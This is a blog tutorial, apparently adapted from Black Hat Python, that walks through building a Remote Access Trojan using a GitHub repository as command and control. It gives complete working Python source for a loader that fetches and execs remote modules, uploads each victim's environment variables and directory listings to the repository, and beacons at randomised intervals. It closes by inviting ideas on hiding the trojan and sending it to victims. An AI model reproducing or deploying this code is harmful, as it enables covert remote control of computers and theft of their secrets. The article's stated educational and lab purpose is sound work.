Disclaimer

The code and techniques provided in this article are intended for educational purposes only. They are designed to help individuals understand the underlying principles of cybersecurity, ethical hacking, and software development. Under no circumstances should the information or code be used for unauthorized access, illegal hacking, or any activities that violate the law.

The author and publisher do not endorse or condone any illegal activities, and they will not be held responsible for any misuse of the information provided. It is the reader’s responsibility to ensure that any use of the techniques or code complies with all applicable laws and regulations. Always seek permission from the rightful owner before testing or interacting with any system or network.

By reading this article, you agree to use the information solely for lawful and ethical purposes.

What is a Remote Access Trojan?
A Remote Access Trojan (RAT) is a type of malware that provides an attacker with unauthorized remote access to a victim’s computer.

Key features of a RAT
Remote Control: A RAT allows the attacker to control the victim’s computer remotely. This can be partial(e.g, logging keystroke) or full(executing commands, accessing files, controlling the mouse and keyboard.)

Keystroke Logging: Many RATs include a keylogger that records every keystroke made by the victim. This can help the attacker capture passwords and other sensitive information.

Screen Capture: RATs can take screenshots of the victim’s screen, allowing the attacker to see what the user is doing in real-time.

File Access: A RAT can browse the victim’s file system, upload or download files, and even delete or modify files.

The list can go on and on…..

How Rats Are Spread
Phishing Emails: A common method of distribution is through phishing emails that trick the victim into downloading and executing the RAT.

Malicious Downloads: RATs can be hidden in seemingly legitimate software downloads from untrusted websites.

Exploits: Attackers may exploit vulnerabilities in software or operating systems to install a RAT without the victim’s knowledge.

Social Engineering: Attackers may use social engineering tactics to convince victims to install the RAT themselves, thinking it’s a useful application.

The Project
Iam by no means a expert of building a RAT, the code we will be using will be heavily inspired by Black Hat Python… Written by Justin Seitz and Tim Arnold. I have modified the code from the book quite a bit to get it to work correctly in my environment. I have added more modules as well… But well get to that.

We will essentially be building a GitHub command and control Trojan. We will be setting up a Trojan framework that we will send to our victim machine that can perform all kinds of nefarious task.

Let’s gets started……….

Setup GitHub
The first thing you will need to do is setup a GitHub account. It’s free and easy to do. After you have done that, we need to set up our repository.

On your git hub, hit add new repository and give it a name. You can make it public or private. After you create your repository, we will need to create a API key so we can connect to our GitHub account. In the top right corner you will need to click on circle with your name or logo.Next scroll down and click settings.On this page at the very bottom you will need to click Developer settings.Click the drop-down Personal access tokens. Then Click Tokens (classic).On the top right click the Generate new token drop-down, then click Generate new token (classic).Give your token a name and choose the expiration.. I just chose no expiration and give my token full access with the tick boxes. Scroll to the bottom and click generate token.

On the next page it will show you your token, Hit the little copy link, and paste it somewhere for the time being. Lets create our directories and get our GitHub connected.

Initializing our Repository
In your terminal type these commands:


Copy

Copy
mkdir Trojan
mkdir data
mkdir modules
mkdir config
mkdir status

touch .gitignore

git add .
git commit -m "Adding repo Structure for trojan"
git remote add origin https://github.com/username/nameofyourrepository
git remote set-url origin https://username:Token@github.com/username/nameofrepo
git branch -M main
git push origin main.


Awesome!! Now you should see a .gitignore file in your repository on GitHub the folders wont show up yet as they have nothing in them yet…

Modules
The modules are going to be individual components of your Trojan, each will be responsible for a specific task (e.g keylogging, data exfiltration, reverse shell) These modules will be individual scripts. Lets create two simple modules now..

Create a file in your modules folder called dirlister.py and enter the code bellow:


Copy

Copy
import os 
def run(**args):
print("[*] In dirlister module")
files = os.listdir(".")
return str(files)
Now we will need to commit our changes every time we add something new. Use the commands bellow any time you make a change to your program.


Copy

Copy
git add .
git commit -m "Leave a note here that will help you remember what your code is doing at any particular time"
git push origin main
So what does this file do?? The script is a simply prints the current working directory. When you create future modules for this Trojan you will need to make sure that you have a run function that takes a variable number of arguments. This way you can load each module in the same way. This will keep with the modularity of the program. Open your terminal and we will create one more module. Open your terminal and name your new file environment.py


Copy

Copy
import os

def run(**args):
    print("[*] In environment module.")
    return os.environ
This, like the other module is also very simple. All this module does is return all the environment variables available to the current process.

Configuration File
Next we will create our configuration file. Jump into your config directory and create a JSON file called abc.json and add the following code:


Copy

Copy
[
  {
    "module" : "dirlister"
  },
  {
    "module" : "environment"
  }
]
We are using JSON here for a couple of reasons:

Lightweight and compact
JSON is lightweight, meaning it doesn’t add much overhead in terms of file size. It is basically a txt file with a compact format, this makes it efficient to parse and process.

JSON can be quickly parsed by many programming languages, including Python.

Not language dependent

JSON is not tied to any specific programming language, which makes it very versatile.

JSON is a common data interchange format, which means it is a standardized format used to exchange data between different systems.

Of course there are many more reasons as well…. Now on to the fun part!



Building our Trojan
To start i am going to show you the whole python script, (in the root dir create file nme trojan.py) then i am going to break it down into all the separate parts. You can just copy and paste this then comeback if you need to figure out what a certain method does.


Copy

Copy
import base64
import github3
import importlib
import json
import random
import sys
import threading
import time
from datetime import datetime

# Function to connect to a GitHub repository using a token stored in a local file
def github_connect():
    # Read the token from 'secret.txt'
    with open('secret.txt') as f:
        token = f.read().strip()
    user = 'yourusername'  # GitHub username
    sess = github3.login(token=token)  # Login to GitHub using the token
    return sess.repository(user, 'nameofyourrepo')  # Return the specific repository 'Trojan'
# Function to retrieve the contents of a file from a specific directory in the GitHub repository
def get_file_contents(dirname, module_name, repo):
    # Fetch the file contents from the specified directory and module name
    return repo.file_contents(f'{dirname}/{module_name}').content
# Class representing the Trojan
class Trojan:
    def __init__(self, id):
        self.id = id  # Identifier for this Trojan instance
        self.config_file = f'{id}.json'  # Configuration file for the Trojan
        self.data_path = f'data/{id}/'  # Path to store data
        self.repo = github_connect()  # Connect to the GitHub repository
    # Method to get the configuration from the GitHub repository
    def get_config(self):
        # Retrieve and decode the configuration file from the 'config' directory
        config_json = get_file_contents('config', self.config_file, self.repo)
        config = json.loads(base64.b64decode(config_json))
        for task in config:
            # Dynamically import the module specified in the configuration
            if task['module'] not in sys.modules:
                exec("import %s" % task['module'])
        return config  # Return the configuration as a dictionary
    # Method to run a specific module from the configuration
    def module_runner(self, module):
        # Execute the 'run' method of the module and store the result
        result = sys.modules[module].run()
        self.store_module_result(result)
    # Method to store the result of a module execution in the GitHub repository
    def store_module_result(self, data):
        message = datetime.now().isoformat()  # Get the current time as a string
        remote_path = f'data/{self.id}/{message}.data'  # Define the remote path in the repository
        # Encode the data to base64
        bindata = base64.b64encode(bytes('%r' % data, 'utf-8'))
        # Create a new file in the repository with the encoded data
        self.repo.create_file(remote_path, message, bindata)
    # Main method to run the Trojan
    def run(self):
        while True:
            config = self.get_config()  # Get the configuration from the repository
            for task in config:
                # For each task in the configuration, run the module in a new thread
                thread = threading.Thread(target=self.module_runner, args=(task['module'],))
                thread.start()
                # Random sleep time between 1 to 10 seconds before starting the next task
                time.sleep(random.randint(1, 10))
            # Random sleep time between 30 minutes to 3 hours before repeating the process
            time.sleep(random.randint(30*60, 3*60*60))
# Class to dynamically import Python modules from the GitHub repository
class GitImporter:
    def __init__(self):
        self.current_module_code = ""  # Store the current module's code
    # Method to find and load the module
    def find_spec(self, fullname, path, target=None):
        print(f"[*] Attempting to retrieve {fullname}")
        self.repo = github_connect()  # Connect to the GitHub repository
        try:
            # Retrieve the module code from the 'modules' directory
            new_library = get_file_contents('modules', f'{fullname}.py', self.repo)
            if new_library is not None:
                # Decode the module code from base64
                self.current_module_code = base64.b64decode(new_library)
                return importlib.util.spec_from_loader(fullname, loader=self)
        except github3.exceptions.NotFoundError:
            print(f"[*] Module {fullname} not found in repository.")
            return None  # Return None if the module is not found
    # Method to create the module (not used, hence returns None)
    def create_module(self, spec):
        return None
    # Method to execute the module code
    def exec_module(self, module):
        # Execute the module code in the context of the module's dictionary
        exec(self.current_module_code, module.__dict__)
# Main section of the script
if __name__ == '__main__':
    # Add the GitImporter to the system's module search path
    sys.meta_path.append(GitImporter())
    # Create a Trojan instance with a specific ID and run it
    trojan = Trojan('abc')
    trojan.run()
Imports
These imports bring in various libraries:

base64: For encoding and decoding data in base64.

github3: A library for interacting with the GitHub API.

importlib: For importing modules programmatically.

json: For parsing and creating JSON data.

random: For generating random numbers.

sys: For accessing system-specific parameters and functions.

threading: For working with threads.

time: For time-related functions.

datetime: For manipulating dates and times.

Github_connect function

Copy

Copy
def github_connect():
    with open('secret.txt') as f:
        token = f.read().strip()
    user = 'hackspark'
    sess = github3.login(token=token)
    return sess.repository(user, 'Trojan')
This function does the following:

Opens a file named secret.txt and reads its content, which is expected to be a GitHub API token.

Defines a GitHub username (user = 'hackspark').

Logs in to GitHub using the provided token (sess = github3.login(token=token)).

Returns a repository object representing the Trojan repository owned by the user hackspark (return sess.repository(user, 'Trojan')).

get_file_contents function

Copy

Copy
def get_file_contents(dirname, module_name, repo):
    return repo.file_contents(f'{dirname}/{module_name}').content
This function:

Takes three parameters: dirname (the directory name), module_name (the module name), and repo (a repository object).

Returns the content of a file located at dirname/module_name in the specified repository.

Trojan Class

Copy

Copy
class Trojan:
    def __init__(self, id):
        self.id = id
        self.config_file = f'{id}.json'
        self.data_path = f'data/{id}/'
        self.repo = github_connect()
The Trojan class is defined as follows:
The __init__ method initializes an instance of the Trojan class with an identifier id.

The id attribute is set to the provided id.

The config_file attribute is set to a string formatted as {id}.json, which implies a configuration file named after the provided id.

The data_path attribute is set to a string formatted as data/{id}/, implying a directory path for storing data related to the id.

The repo attribute is set to the result of the github_connect() function, which returns a repository object for the Trojan repository owned by the user hackspark.

Get config method

Copy

Copy
def get_config(self):
    config_json = get_file_contents('config', self.config_file, self.repo)

Copy

Copy
    config = json.loads(base64.b64decode(config_json))    for task in config:
        if task['module'] not in sys.modules:
            exec("import %s" % task['module'])    return config
Fetch Configuration File

Copy

Copy
config_json = get_file_contents('config', self.config_file, self.repo)
This line calls the get_file_contents function, passing config as the directory name, self.config_file (which is {id}.json) as the module name, and self.repo as the repository object.

The function returns the content of the specified file in the repository, which is expected to be a base64-encoded JSON string.

2. Decode Base64 and Parse JSON


Copy

Copy
config = json.loads(base64.b64decode(config_json))
The fetched config_json is base64-decoded using base64.b64decode(config_json).

The decoded string is then parsed into a Python dictionary using json.loads(...).

3. Import Modules Dynamically


Copy

Copy
for task in config:
    if task['module'] not in sys.modules:
        exec("import %s" % task['module'])
The method iterates over each task in the config dictionary.

For each task, it checks if the module specified in task['module'] is already loaded in sys.modules.

If the module is not already loaded, it dynamically imports the module using exec("import %s" % task['module']).

exec is used to execute the import statement as a string. For example, if task['module'] is 'example_module', exec("import %s" % task['module']) becomes exec("import example_module").

4. Return Configuration


Copy

Copy
return config
Finally, the method returns the parsed configuration dictionary.

Module_runner Method
The module_runner method is responsible for running a specific module and storing the result. Here is a detailed explanation of each part of this method.


Copy

Copy
def module_runner(self, module):
    result = sys.modules[module].run()
    self.store_module_result(result)
Run the Module

Copy

Copy
result = sys.modules[module].run()
sys.modules is a dictionary that maps module names to module objects that have already been loaded.

sys.modules[module] retrieves the module object corresponding to the module name provided.

The run() method of the retrieved module object is called.

The result of the run() method is stored in the variable result.

2. Store the Result


Copy

Copy
self.store_module_result(result)
self.store_module_result(result) calls the store_module_result method of the Trojan class.

It passes the result obtained from running the module as an argument to the store_module_result method.

This implies that store_module_result is responsible for handling the result, likely by saving it or sending it somewhere.

Store_module_result

Copy

Copy
def store_module_result(self, data):
        message = datetime.now().isoformat()  # Get the current time as a string
        remote_path = f'data/{self.id}/{message}.data'  # Define the remote path in the repository
        # Encode the data to base64
        bindata = base64.b64encode(bytes('%r' % data, 'utf-8'))
        # Create a new file in the repository with the encoded data
        self.repo.create_file(remote_path, message, bindata)
Timestamp Generation

Copy

Copy
message = datetime.now().isoformat()
This line generates a timestamp in ISO 8601 format, which is a standardized way of representing date and time.

The isoformat() method converts the current date and time to a string like "2024-08-08T14:45:00". This timestamp is used to uniquely identify the result and to mark when the data was stored.

2. Defining the Remote Path


Copy

Copy
remote_path = f'data/{self.id}/{message}.data'
This line creates a file path for where the data will be stored in the repository.

self.id is the identifier for this Trojan instance, which ensures that data from different instances are stored in separate directories.

The file is named using the timestamp (e.g., "2024-08-08T14:45:00.data"), ensuring each file has a unique name based on when it was generated.

3. Encoding the Data


Copy

Copy
bindata = base64.b64encode(bytes('%r' % data, 'utf-8'))
The result of the module execution (data) is first converted into a string representation using '%r' % data, which formats the data using the repr() function.

This string is then converted into a byte string (bytes(..., 'utf-8')) and subsequently encoded in base64 (base64.b64encode).

Base64 encoding is used to safely encode the data into a text format, ensuring it can be stored in a file without any issues related to binary data.

4. Storing the Encoded Data in GitHub


Copy

Copy
self.repo.create_file(remote_path, message, bindata)
This line uploads the encoded data to the GitHub repository.

create_file is a method provided by the github3 library, which takes the remote_path where the file will be stored, a commit message (message), and the content of the file (bindata).

The commit message is the same as the timestamp, making it clear when this file was created in the repository.

Run Method

Copy

Copy
def run(self):
        while True:
            config = self.get_config()  # Get the configuration from the repository
            for task in config:
                # For each task in the configuration, run the module in a new thread
                thread = threading.Thread(target=self.module_runner, args=(task['module'],))
                thread.start()
                # Random sleep time between 1 to 10 seconds before starting the next task
                time.sleep(random.randint(1, 10))
            # Random sleep time between 30 minutes to 3 hours before repeating the process
            time.sleep(random.randint(30*60, 3*60*60))
Infinite Loop

Copy

Copy
While True:
This starts an infinite loop, meaning the method will continuously run until externally interrupted.
2. Fetch Configuration


Copy

Copy
config = self.get_config()
Calls the get_config method to fetch and parse the configuration file.

The config variable holds the list of task dictionaries obtained from the configuration file.

3. Iterate Over Tasks


Copy

Copy
for task in config:
Iterates over each task in the config list.
4. Create and Start a Thread for Each Task


Copy

Copy
thread = threading.Thread(target=self.module_runner, args=(task['module'],))
thread.start()
Creates a new thread for each task using the threading.Thread class.

The target function for the thread is self.module_runner.

args=(task['module'],) passes the module name as an argument to module_runner.

Starts the thread with thread.start(), which runs module_runner in a separate thread.

5. Random Sleep Between Task Threads


Copy

Copy
time.sleep(random.randint(1, 10))
Pauses the main loop for a random interval between 1 and 10 seconds before starting the next task.

This introduces a delay between starting each task to avoid starting them all at the same time.

6. Random Sleep Between Iterations


Copy

Copy
time.sleep(random.randint(30*60, 3*60*60))
After all tasks in the configuration have been started, pauses the loop for a random interval between 30 minutes (3060 seconds) and 3 hours (360*60 seconds) before fetching the configuration and starting over.

This introduces a delay between iterations of fetching and executing tasks, providing a periodic execution pattern.

GitImporter Class
__init__ Method

Copy

Copy
def __init__(self):
    self.current_module_code = ""  # Store the current module's code
This is the constructor of the GitImporter class. It initializes an instance variable current_module_code to an empty string. This variable will be used to store the code of the module that will be dynamically loaded.

2. find_spec Method


Copy

Copy
def find_spec(self, fullname, path, target=None):
    print(f"[*] Attempting to retrieve {fullname}")
    self.repo = github_connect()  # Connect to the GitHub repository
    try:
        # Retrieve the module code from the 'modules' directory
        new_library = get_file_contents('modules', f'{fullname}.py', self.repo)
        if new_library is not None:
            # Decode the module code from base64
            self.current_module_code = base64.b64decode(new_library)
            return importlib.util.spec_from_loader(fullname, loader=self)
    except github3.exceptions.NotFoundError:
        print(f"[*] Module {fullname} not found in repository.")
        return None  # Return None if the module is not found
Purpose: This method is responsible for locating and loading the module code.

Arguments:

fullname: The fully qualified name of the module to be loaded.

path: The search path for modules. Not used in this context.

target: Optional target module. Not used here.

Process:

The method connects to the GitHub repository using the github_connect() function.

It tries to retrieve the module code from a directory named modules in the repository.

If the module is found, it is base64-decoded and stored in self.current_module_code.

importlib.util.spec_from_loader is used to create a module spec, which Python uses to load the module.

If the module is not found, an exception is caught, and None is returned.

3. create_module Method


Copy

Copy
def create_module(self, spec):
    return None
Purpose: This method is required by the module loading protocol but is not used in this implementation.

It returns None, indicating that the default module creation process should be used.

4. exec_module Method


Copy

Copy
def exec_module(self, module):
    # Execute the module code in the context of the module's dictionary
    exec(self.current_module_code, module.__dict__)
Purpose: This method is responsible for executing the module’s code once it has been loaded.

Process:

The exec function is used to execute the code stored in self.current_module_code.

The code is executed within the context of the module’s dictionary (module.__dict__), which contains the module's variables and functions.

Main Section


Copy

Copy
if __name__ == '__main__':
    # Add the GitImporter to the system's module search path
    sys.meta_path.append(GitImporter())
    # Create a Trojan instance with a specific ID and run it
    trojan = Trojan('abc')
    trojan.run()
The GitImporter is added to sys.meta_path, which is a list of finders that Python uses to locate modules. By adding GitImporter to this list, Python will use it to try to locate and load any module that is imported in the script.

A new instance of the Trojan class is created with the ID 'abc'.

The run method of the Trojan instance is called, which starts the execution of the Trojan.

Create a file in the same directory as your trojan.py, call it secret.txt and add your token you received from GitHub. Open your .gitignore and type the name of your secret.txt file at the top. Save and push your changes to GitHub.

Awesome!!! Now i know that is a lot to get through, this is the way i learn anything new. I break it down into each individual part. Now lets test our Trojan and see if we can get it to connect to our GitHub. Open your terminal and type the following:


Copy

Copy
python3 trojan.py
Now our program is running!!! Give it a few mins, then hit ctrl + c to stop the program. Now lets pull down our data from GitHub and see i it worked!!

In your terminal type:


Copy

Copy
git pull


It Worked!!! As you can see our program created two files in our data directory inside of our GitHub. Now cd into the data directory and lets take a look.

Here we can see a file called abc. This will hold all of our data that we received from our modules. cd into abc:Here we can see the data with the time stamps we set up. Lets check whats in there.Looks like a bunch of encrypted data! Lets unencrypt it and see what we got.we can use the command above to unencrypt the data from our files.


Copy

Copy
base64 -d nameoffile
Here is our data from our dirlister module. Now you can do the same thing with the other file.

Awesome! Now we are finished with our Trojan.. I won’t be showing you how to send it to a target just yet, in the future i will be writing more articles that will follow along with the lab i have set up in my Ultimate Cybersecurity lab with Proxmox series. We will inject this Trojan into our active directory and add more modules. We will also be using the Blue team labs to find the Trojan and remove it.

Questions:

How can we add to this script??

How can we hide it??

What steps do we need to take to send this to our victim??

What modules would be effective?

Leave a comment, let’s have a discussion…..

Play around with it. Add your own configurations, modules, add more functionality this script can me made into an amazing program…. Get creative. As always thank you for reading. Leaving me a comment, Hit the clap icon 16,000 times, share share share. See you in the next one!!!
